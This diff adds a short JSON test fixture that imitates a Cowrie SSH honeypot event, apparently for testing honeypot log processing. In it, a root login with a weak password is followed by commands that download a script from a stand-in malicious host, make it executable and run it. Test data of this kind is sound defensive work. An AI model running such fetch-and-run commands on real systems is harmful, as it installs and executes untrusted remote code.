@@ -1,0 +1,16 @@
+{
+  "event_id": "test-event-123",
+  "timestamp": "2023-06-15T12:34:56Z",
+  "src_ip": "192.168.1.100",
+  "eventid": "cowrie.login.success",
+  "username": "root",
+  "password": "password123",
+  "session": "test-session-1",
+  "protocol": "ssh",
+  "commands": [
+    "ls -la",
+    "wget http://malicious.example.com/malware.sh",
+    "chmod +x malware.sh",
+    "./malware.sh"
+  ]
+}
